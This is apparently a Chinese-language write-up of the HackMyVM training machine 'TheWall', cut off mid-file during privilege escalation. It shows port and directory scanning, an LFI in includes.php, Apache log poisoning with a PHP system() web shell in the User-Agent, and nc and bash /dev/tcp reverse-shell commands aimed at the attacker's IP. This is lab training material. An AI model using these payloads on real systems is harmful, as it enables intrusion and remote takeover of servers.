---
title: TheWall
author: hgbe02
date: 2024-08-08 02:40:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/TheWall.html"
---

# TheWall

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249032.png" alt="image-20240807200203783" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249034.png" alt="image-20240807200825691" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/TheWall]
└─$ rustscan -a $IP -- -sCV           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.4:22
Open 172.20.10.4:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 89:60:29:db:68:6d:13:34:98:b9:d0:17:24:56:a8:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChNipr9+bjOokVMBrjSmrgIJS/wPTcNhqFO1J88LuelAOdxbi4OhVAxb+57X3oKKUsAlVcdA37dqf0lVofAxiWmv2ZaeSwpb0WaMWFu5EjWvcsuk58GP9jjEf0L1/0+KZhTFHZDjk9Z5dmFfQHShN6W7eHWBq8wEyGt2re5PG4f3rYw+xg67FJvhJL/Pe73AKy+Obw2Sz5TCRtzUsGJ/TBmGrdwRHAY2l1gLLhf88d0gS7e1b3MyampOA8/qao7DdbFgXC9rVCBJXDIC6e7EG8FyMRYlwl6CvH4mqENvsV8z7p7DXCXysd2I+bnnyPxGRhqLEMMZwTyg7rsU3dl6B3u2L0PjwrEAqaeAwG954E8wbw2ZNu96s4ur09Mv2dXnNP1YUfwPBJPx8/GcNkmaqLbE5mv4QWy2yU0GFolL7IsLKiEY+t9IDB1uuaBfzIVMKeMy79UB6MLHkLf6XZtrf+ZwtH6X+4tYTh+Oq1E/dWvesrmCbQGKT+7ySqwhkpX6E=
|   256 66:58:51:6d:cd:3a:67:46:36:56:9a:31:a0:08:13:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLFGz/P+fNPCJ1TCYaVG4Tdd+S4Lv7xOhue5O9FydkuNTIpH3Bk8FN6RjBuZC0rrJs09JW6ld3auLqxjr+0O+lk=
|   256 f7:34:9e:53:68:ba:c2:06:ab:14:c3:21:90:2d:6e:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDTmiQOvs05b9nDE3ynMrEE9keomXq4VzGk0r6koRdr
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

服务器上做了限制，不允许扫描线程过大，尝试进行修改扫描，以下是wp给的，好吧，我是直接看的wp。。。

```bash
gobuster -q dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -u http://10.0.2.31 --delay 1s -t 1
ffuf -u http://$(IP)/FUZZ -w /opt/wordlists/directory-list-lowercase-2.3-medium.txt -fs 25 -e '.php' -rate 1
```

得到目录·`index.php`，`includes.php`

## 漏洞发现

### 踩点

```bash
┌──(kali💀kali)-[~/temp/TheWall]
└─$ whatweb http://$IP
http://172.20.10.4 [200 OK] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[172.20.10.4]

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl -s http://$IP | html2text
****** Forbidden ******

C:\Users\Administrator>curl http://172.20.10.4

<h1>HELLO WORLD!</h1>
```

这是 IP 被 ban 掉了吗？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249035.png" alt="image-20240807201724994" style="zoom:33%;" />

### FUZZ目录

发现了一个php文件，尝试进行探测，发现是空白页，尝试fuzz是否存在`lfi`或者命令执行：

```bash
┌──(kali💀kali)-[~/temp/TheWall]
└─$ ffuf -u 'http://172.20.10.3/includes.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -fs 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.20.10.3/includes.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2
________________________________________________

display_page            [Status: 200, Size: 1460, Words: 15, Lines: 29, Duration: 206ms]
:: Progress: [220560/220560] :: Job [1/1] :: 224 req/sec :: Duration: [0:09:13] :: Errors: 0 ::
```

### LFI

发现存在参数`display_page`可以进行提取文件，进一步尝试：

```bash
# http://172.20.10.4/includes.php?display_page=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin

# http://172.20.10.4/includes.php?display_page=/home/john/user.txt
cc5db5e7b0a26e807765f47a006f6221

# http://172.20.10.4/includes.php?display_page=/etc/hostname
TheWall
```

进行fuzz：

```bash
┌──(kali💀kali)-[~/temp/TheWall]
└─$ ffuf -u 'http://172.20.10.4/includes.php?display_page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -c | wc -l            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.20.10.4/includes.php?display_page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [880/880] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
880
```

尝试看一下哪些有戏，这次 FUZZ 不是很准的样子：

```bash
for i in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt); do echo "[+] payload: $i" >> result.txt; curl -s "http://172.20.10.4/includes.php?display_page=$i" | head -n 20 >> result.txt; done
```

尝试进行日志包含：

```bash
[+] payload: /var/log/apache2/access.log

172.20.10.8 - - [07/Aug/2024:20:29:37 -0400] "GET / HTTP/1.1" 200 173 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:20:32:33 -0400] "GET /includes.php?display_page=/var/log/apache2/error.log HTTP/1.1" 200 727 "-" ""
172.20.10.8 - - [07/Aug/2024:20:32:45 -0400] "GET /includes.php?display_page=/var/log/apache2/error.log&0=whoami HTTP/1.1" 200 727 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:20:33:05 -0400] "GET /includes.php?display_page=/var/www/html/waf.php HTTP/1.1" 500 187 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?images=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?index=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?2005=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?products=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?sitemap=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?archives=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?1=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?09=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?links=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?08=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?06=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?2=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?07=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?login=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
172.20.10.8 - - [07/Aug/2024:20:36:20 -0400] "GET /includes.php?articles=/etc/passwd HTTP/1.1" 200 149 "-" "Fuzz Faster U Fool v2.1.0-dev"
[+] payload: /var/log/apache2/error_log

[+] payload: /var/log/apache2/error.log

[Wed Aug 07 20:28:51.220649 2024] [mpm_prefork:notice] [pid 488] AH00163: Apache/2.4.54 (Debian) configured -- resuming normal operations
[Wed Aug 07 20:28:51.220698 2024] [core:notice] [pid 488] AH00094: Command line: '/usr/sbin/apache2'
[Wed Aug 07 20:29:37.282433 2024] [php7:notice] [pid 496] [client 172.20.10.8:36616] PHP Notice:  Undefined variable: db in /var/www/html/waf.php on line 21
[Wed Aug 07 20:29:37.283361 2024] [php7:notice] [pid 496] [client 172.20.10.8:36616] PHP Notice:  Undefined variable: db in /var/www/html/waf.php on line 21
[Wed Aug 07 20:33:05.966244 2024] [php7:error] [pid 499] [client 172.20.10.8:44366] PHP Fatal error:  Cannot declare class WAF, because the name is already in use in /var/www/html/waf.php on line 2
[Wed Aug 07 20:36:20.555260 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.559092 2024] [php7:notice] [pid 530] [client 172.20.10.8:58016] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.561646 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.564073 2024] [php7:notice] [pid 530] [client 172.20.10.8:58016] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.566486 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.568447 2024] [php7:notice] [pid 530] [client 172.20.10.8:58016] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.569978 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.571975 2024] [php7:notice] [pid 530] [client 172.20.10.8:58016] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.573829 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.575612 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.578011 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.580079 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.582263 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
[Wed Aug 07 20:36:20.586460 2024] [php7:notice] [pid 500] [client 172.20.10.8:58024] PHP Notice:  Undefined index: display_page in /var/www/html/includes.php on line 3
```

在此之前先重导入一下靶机，因为之前测试太多对日志产生了污染，然后尝试执行系统命令：

> 实际上上面的扫描结果就是重新导入扫出来的，不然没有`access.log`，就是因为日志被打乱了，请见vcr。。。。

```bash
┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/etc/passwd"                

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log"

172.20.10.8 - - [07/Aug/2024:21:19:13 -0400] "GET / HTTP/1.1" 200 173 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:19:55 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 260 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:03 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/8.5.0"

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/etc/passwd" -A "<?php system($_GET[0]); ?>" -v
*   Trying 172.20.10.5:80...
* Connected to 172.20.10.5 (172.20.10.5) port 80
> GET /includes.php?display_page=/etc/passwd HTTP/1.1
> Host: 172.20.10.5
> User-Agent: <?php system(); ?>
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 08 Aug 2024 01:21:00 GMT
< Server: Apache/2.4.54 (Debian)
< Vary: Accept-Encoding
< Content-Length: 1460
< Content-Type: text/html; charset=UTF-8
< 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
* Connection #0 to host 172.20.10.5 left intact

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log"                   

172.20.10.8 - - [07/Aug/2024:21:19:13 -0400] "GET / HTTP/1.1" 200 173 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:19:55 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 260 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:03 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:05 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 526 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:21:00 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" ""

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/etc/passwd" -A '<?php system($_GET[0]); ?>' -v
*   Trying 172.20.10.5:80...
* Connected to 172.20.10.5 (172.20.10.5) port 80
> GET /includes.php?display_page=/etc/passwd HTTP/1.1
> Host: 172.20.10.5
> User-Agent: <?php system($_GET[0]); ?>
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 08 Aug 2024 01:21:41 GMT
< Server: Apache/2.4.54 (Debian)
< Vary: Accept-Encoding
< Content-Length: 1460
< Content-Type: text/html; charset=UTF-8
< 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
* Connection #0 to host 172.20.10.5 left intact

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=whoami"          

172.20.10.8 - - [07/Aug/2024:21:19:13 -0400] "GET / HTTP/1.1" 200 173 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:19:55 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 260 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:03 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:05 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 526 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:21:00 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" ""
172.20.10.8 - - [07/Aug/2024:21:21:14 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 781 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:21:41 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "www-data
"

# curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=cat+/var/www/html/waf.php"

┌──(kali💀kali)-[~/temp/TheWall]
└─$ curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=id"    

172.20.10.8 - - [07/Aug/2024:21:19:13 -0400] "GET / HTTP/1.1" 200 173 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:19:55 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 260 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:03 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:20:05 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 526 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:21:00 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" ""
172.20.10.8 - - [07/Aug/2024:21:21:14 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 781 "-" "curl/8.5.0"
172.20.10.8 - - [07/Aug/2024:21:21:41 -0400] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
"
172.20.10.8 - - [07/Aug/2024:21:21:49 -0400] "GET /includes.php?display_page=/var/log/apache2/access.log&0=whoami HTTP/1.1" 200 1045 "-" "curl/8.5.0"
```

尝试进行反弹shell：

```bash
# curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=nc+-e+/bin/bash+172.20.10.8+1234"
# curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=bash%20-c%20'exec%20bash%20-i%20&%3E/dev/tcp/172.20.10.8/1234%20%3C&1'"
# curl "http://172.20.10.5/includes.php?display_page=/var/log/apache2/access.log&0=bash+-c+%27exec+bash+-i+%26>%2Fdev%2Ftcp%2F172.20.10.8%2F1234+<%261%27"
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408080249036.png" alt="image-20240808012740392" style="zoom: 50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@TheWall:/var/www/html$ cd ~
(remote) www-data@TheWall:/var/www$ ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Oct 19  2022 .
drwxr-xr-x 12 root     root     4096 Oct 17  2022 ..
drwxr-xr-x  2 www-data www-data 4096 Aug  7 21:27 data
drwxr-xr-x  2 www-data www-data 4096 Oct 19  2022 html
(remote) www-data@TheWall:/var/www$ cd data
(remote) www-data@TheWall:/var/www/data$ ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 Aug  7 21:27 .
drwxr-xr-x 4 www-data www-data 4096 Oct 19  2022 ..
-rw-r--r-- 1 www-data www-data    6 Aug  7 21:27 waf.bl.txt
-rw-r--r-- 1 www-data www-data    6 Aug  7 21:27 waf.db.txt
(remote) www-data@TheWall:/var/www/data$ cat waf.*
a:0:{}a:0:{}(remote) www-data@TheWall:/var/www/data$ cd ../html
(remote) www-data@TheWall:/var/www/html$ ls -la
total 24
drwxr-xr-x 2 www-data www-data 4096 Oct 19  2022 .
drwxr-xr-x 4 www-data www-data 4096 Oct 19  2022 ..
-rw-r--r-- 1 www-data www-data  134 Oct 18  2022 .htaccess
-rw-r--r-- 1 root     root      164 Oct 18  2022 includes.php
-rw-r--r-- 1 root     root       70 Oct 18  2022 index.php
-rw-r--r-- 1 root     root     2083 Oct 18  2022 waf.php
(remote) www-data@TheWall:/var/www/html$ cat waf.php 
<?php
class WAF
{
        const attempts = 200;
        const outTime  = 2;
        const path     = "/var/www/data/";
        const dbFile   = "waf.db.txt";
        const blFile   = "waf.bl.txt";

        private static function loadClean($dbf) {
                $dbf = self::path.$dbf;

                if(file_exists($dbf)) {
                        $db = unserialize(file_get_contents($dbf));
                } else {
                        if (!is_dir(self::path)){
                                mkdir(self::path);
                        }
                }

                if (!is_array($db)){
                        $db = array();
                }

                foreach ($db as $row => $sub_array) {
                        if($sub_array['time'] < time()) {
